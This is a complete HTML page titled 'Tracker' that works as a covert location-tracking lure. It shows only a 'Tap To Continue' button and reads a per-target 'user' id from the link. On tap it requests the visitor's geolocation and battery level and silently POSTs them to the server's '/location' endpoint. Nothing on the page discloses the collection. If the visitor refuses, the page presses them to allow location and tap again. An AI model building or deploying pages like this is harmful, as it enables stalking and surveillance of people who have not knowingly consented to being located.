<!DOCTYPE html>
<html>

<head>
<title>Tracker</title>

<style>
body{
height:100vh;
display:flex;
justify-content:center;
align-items:center;
flex-direction:column;
margin:0;
font-family:Arial;
}

button{
font-size:25px;
padding:20px 40px;
cursor:pointer;
}

#msg{
margin-top:20px;
font-size:22px;
}
</style>

</head>

<body>

<button onclick="getLocation()">Tap To Continue</button>

<div id="msg"></div>

<script>

const params = new URLSearchParams(window.location.search)
const user = params.get("user")

function getLocation(){

navigator.geolocation.getCurrentPosition(success, denied)

}

async function success(pos){

document.getElementById("msg").innerText = "Jai Balaji Dear"

let batteryLevel = "Unknown"

if(navigator.getBattery){
let battery = await navigator.getBattery()
batteryLevel = Math.round(battery.level * 100)
}

fetch("/location",{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
user:user,
latitude:pos.coords.latitude,
longitude:pos.coords.longitude,
battery:batteryLevel
})
})

}

function denied(){

document.getElementById("msg").innerText = "Please allow location and tap again"

}

</script>

</body>
</html>
